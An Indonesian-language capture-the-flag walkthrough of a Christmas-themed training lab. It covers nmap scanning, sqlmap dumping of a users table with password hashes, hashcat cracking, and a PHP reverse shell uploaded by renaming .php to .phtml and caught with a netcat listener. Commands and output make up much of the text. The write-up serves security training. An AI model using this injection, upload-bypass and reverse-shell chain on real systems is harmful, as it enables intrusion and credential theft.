lakukan scanning dengan nmap
```
nmap -sC -sV -Pn IP-target
...
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...                                                                  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                  
...
```

ternyata hanya 2 port yang terbuka, selanjutnya kita coba buka di browser karena terdapat port http `http://IP-target`. Setelah membukanya di browser, ternyata langsung masuk ke login page. Namun kita tidak bisa melakukan sqli pada login page tersebut, jadi kita akan melakukan registrasi.

Setelah melakukan regist, buka burpsuite dan siapkan untuk intercept. Kembali ke web, masukkan email dan password hasil registrasi sebelumnya dalam web. Selanjutnya klik login, maka kita akan kembali ke burpsuit. Kita save request yang telah kita lakukan saat login barusan. dengan cara klik kanan pada field dibawah intercept, lalu pilih save. contoh: save menjadi `request.txt`.

Tahap selanjutnya kita akan menggunakan SQLMap.
```
sqlmap -r request.txt --dbs -dump
```
selanjutnya akan ada beberapa prompt setting, kita bisa langsung mengikuti defaultnya saja. contoh `(Y/n)` huruf kapital merupakan default, jadi bisa langsung input `y` dan enter.

berikut adalah jawaban dari soal pertama dengan simbol "`***_*****`" yang menjawab tentang field apa yang injectable. silakan dicari pada hasil enumerasi yang telah kamu lakukan dengan sqlmap.
```
...
[13:39:52] [INFO] testing if the target URL content is stable 
[13:39:53] [WARNING] POST parameter '***_*****' does not appear to be dynamic
[13:39:53] [WARNING] heuristic (basic) test shows that POST parameter '***_*****' might not be injectable                            
[13:39:53] [INFO] heuristic (XSS) test shows that POST parameter '***_*****' might be vulnerable to cross-site scripting (XSS) attacks
[13:39:53] [INFO] testing for SQL injection on POST parameter '***_*****'
[13:39:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:39:54] [WARNING] reflective value(s) found and filtering out
[13:39:56] [INFO] POST parameter '***_*****' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
...
```

Selanjutnya disini kita mendapatkan banyak sekali tabel, tapi tabel yang paling menarik adalah tabel users.
```
[10 entries]
+----+------------------------+---------------------------------------------------+-----------------------+----------------+-------->
| id | email                  | password                                          | username              | last_name      | num_lik>
+----+------------------------+---------------------------------------------------+-----------------------+----------------+-------->
| 1  | ******@shefesh.com     | f1267830a78c0b59acc06b05694b2e28 | santa_claus           | Claus          | 2      >
| 2  | mmtoe@shefesh.com      | 402223cb4df4c5050a38043d38b1372b | mommy_mistletoe       | Mistletoe      | 0      >
| 3  | terminator@shefesh.com | 78a6d0e6c73a29ef6d07d56f32f67b30 | arnold_schwarzenegger | Schwarzenegger | 0      >
| 4  | jayfkay@shefesh.com    | bc808149a93bc7050c3c6c4b7a5a0c97 | johnfortnite_kennedy  | Kennedy        | 0      >
| 5  | john@keepingit.online  | aa4e356d1509f1c1f53e0191601cde72 | john_richardson       | Richardson     | 1      >
| 6  | notty@shefesh.com      | 6aff5ae0718de8945a3f71ba4d1ca76f | naughty_elf           | Elf            | 0      >
| 7  | felixnav@shefesh.com   | 57e9eb182943223b0b4e7f17c5e4cb6e | felix_navidad         | Navidad        | 0      >
| 8  | mrsclaus@shefesh.com   | 15bc4f3ba871b2fa651363dcddfb27d9 | jessica_claus         | Claus          | 0      >
| 9  | mailman@shefesh.com    | a60c0662c54bde0301d9aa2ad86203df | myron_larabee         | Larabee        | 0      >
| 10 | a@a.com                | 040b7cf4a55014e185813e0644502ea9 | 1234_1234             | 1234           | 0      >
+----+------------------------+------------------------------------------+-----------------------+----------------+-----------+----->
```

password yang ada masih berbentuk hash. Kita dapat crack password menggunakan tools online seperti [crackstation](https://crackstation.net/) atau menggunakan `hashcat` seperti berikut
```
#contoh password santa
hashcat -a 0 -m 0 "f1267830a78c0b59acc06b05694b2e28" /usr/share/wordlists/rockyou.txt 
...
...
f1267830a78c0b59acc06b05694b2e28:***********
...
```

untuk pertanyaan kedua tentang email dan plain text password dari Santa, dapat dilihat pada tabel user yang didapat, dan hasil crack hash.

selanjutnya login menggunakan akun Santa. Pergi ke messages dengan cara klik icon surat pada kanan atas dan klik surat dari Mommy Mistletoe.

untuk pertanyaan terakhir, kita akan menggunakan revshell. Kita akan menggunakan revshell dari [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Jangan lupa untuk mengubah bagian
```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```
menjadi IP-lokal tun0 dan PORT sesuai keinginan.

selanjutnya kita coba upload langsung pada post langsung. Namun, ternyata PHP file di block dengan adanya warning "`Naughty! You aren't allowed to upload php files here`". Kita bisa coba untuk mengganti extensi filenya. Hidupkan intercept pada burpsuite, selanjutnya upload seperti biasa, dan klik post, nantinya kita akan masuk ke burpsuite lagi. Kali ini kita bisa mencoba mengganti ekstensinya dari `.php` ke `.phtml`.
```
... # before
-----WebKitFormBoundaryXQZr9pTNSPQJ7tFb
Content-Disposition: form-data; name="fileToUpload"; filename="php-reverse-shell.php"
Content-Type: application/x-php
...
```

```
... # after
-----WebKitFormBoundaryXQZr9pTNSPQJ7tFb
Content-Disposition: form-data; name="fileToUpload"; filename="php-reverse-shell.phtml"
Content-Type: application/x-php
...
```

lalu klik forward terus sampai request yang muncul di burpsuite habis, dan ketika di cek ternyata sudah berhasil untuk upload. selanjutnya kita bisa setup netcat listener pada port sesuai yang telah disetting.
```
nc -lvnp PORT
```

selanjutnya klik pada icon gambar rusak pada post yang barusan dibuat (bisa juga dengan klik kanan pada icon dan open in new tab). nantinya akan muncul shell session pada netcat.

Setelah berhasil terkoneksi, kita dapat melihat flag untuk menjawab pertanyaan terakhir di `/home/user/flag.txt`.